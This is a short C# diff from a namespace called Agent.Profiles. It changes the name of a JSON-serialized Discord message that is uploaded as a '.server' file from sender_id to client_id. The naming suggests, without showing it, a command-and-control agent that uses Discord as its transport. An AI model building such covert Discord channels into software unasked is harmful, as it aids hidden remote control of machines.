@@ -181,7 +181,7 @@ namespace Agent.Profiles
             {
                 using (MemoryStream stream = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(discordMessage))))
                 {
-                    await channel.SendFileAsync(stream, discordMessage.sender_id + ".server");
+                    await channel.SendFileAsync(stream, discordMessage.client_id + ".server");
                 }
             }
             else
